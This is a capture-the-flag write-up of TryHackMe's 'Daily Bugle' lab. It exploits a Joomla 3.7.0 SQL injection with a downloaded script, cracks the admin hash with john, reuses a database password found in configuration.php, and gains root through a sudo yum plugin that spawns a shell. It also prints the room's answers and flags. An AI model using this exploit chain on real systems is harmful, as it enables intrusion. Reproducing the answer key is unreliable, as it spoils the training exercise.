# Daily Bugle

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

[Daily Bugle](https://tryhackme.com/room/dailybugle)

## Topic's

- Network Enumeration
- Web Poking
- Enumeration (Joomla)
- CVE-2017-8917 - Joomla! 3.7.0
- Brute Forcing (Joomla)
- Stored Passwords & Keys
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy

Deploy the machine - it may take up to 2 minutes to configure

```
kali@kali:~/CTFs/tryhackme/Daily Bugle$ sudo nmap -A -sS -sC -sV -O 10.10.129.91
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-13 14:44 CEST
Nmap scan report for 10.10.129.91
Host is up (0.038s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=30379%PV=Y%DS=2%DC=T%G=Y%TM=5F85A1
OS:55%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=A)SEQ(SP=
OS:105%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   36.05 ms 10.8.0.1
2   36.60 ms 10.10.129.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.41 seconds
```

1. Access the web server, who robbed the bank?

![](./2020-10-13_14-46.png)

`SpiderMan`

## Task 2 Obtain user and root

Hack into the machine and obtain the root user's credentials.

[http://10.10.129.91/robots.txt](http://10.10.129.91/robots.txt)

```
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.129.91/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://10.10.129.91/administrator/components
http://10.10.129.91/administrator/modules
http://10.10.129.91/administrator/templates
http://10.10.129.91/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.129.91/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.129.91/robots.txt

Interesting path found from robots.txt
http://10.10.129.91/joomla/administrator/
http://10.10.129.91/administrator/
http://10.10.129.91/bin/
http://10.10.129.91/cache/
http://10.10.129.91/cli/
http://10.10.129.91/components/
http://10.10.129.91/includes/
http://10.10.129.91/installation/
http://10.10.129.91/language/
http://10.10.129.91/layouts/
http://10.10.129.91/libraries/
http://10.10.129.91/logs/
http://10.10.129.91/modules/
http://10.10.129.91/plugins/
http://10.10.129.91/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.129.91/
```

1. What is the Joomla version?

`3.7.0`

2. _Instead of using SQLMap, why not use a python script!_ What is Jonah's cracked password?

[Joomla! 3.7.0 - 'com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033)

```
kali@kali:~/CTFs/tryhackme/Daily Bugle$ wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
--2020-10-13 14:53:48--  https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6024 (5.9K) [text/plain]
Saving to: ‘joomblah.py’

joomblah.py                                   100%[================================================================================================>]   5.88K  --.-KB/s    in 0.007s

2020-10-13 14:53:48 (819 KB/s) - ‘joomblah.py’ saved [6024/6024]

kali@kali:~/CTFs/tryhackme/Daily Bugle$ python joomblah.py http://10.10.129.91/

    .---.    .-'''-.        .-'''-.
    |   |   '   _    \     '   _    \                            .---.
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
|____.'                                                                `--'  `" '---'   '---'

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
kali@kali:~/CTFs/tryhackme/Daily Bugle$ echo -n '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > johan.hash
kali@kali:~/CTFs/tryhackme/Daily Bugle$ john johan.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)
1g 0:00:09:58 DONE (2020-10-13 15:05) 0.001670g/s 78.26p/s 78.26c/s 78.26C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`spiderman123`

3. What is the user flag?

```
cd /var/www/html
sh-4.2$ ls
ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt
sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
```

```
sh-4.2$ su - jjameson
su - jjameson
Password: nv5uz9r3ZEDzVjNu
id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
cd ~
ls
user.txt
cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

`27a260fe3cba712cfdedb1c86d80442e`

4. What is the root flag?

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

[https://gtfobins.github.io/gtfobins/yum/#sudo](https://gtfobins.github.io/gtfobins/yum/#sudo)

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# cd /root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```

`eec3d53292b1821868266858d7fa6f79`

## Task 3 Credits

This room uses artwork that is owned by Sony Pictures

1. Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located here.

`No answer needed`
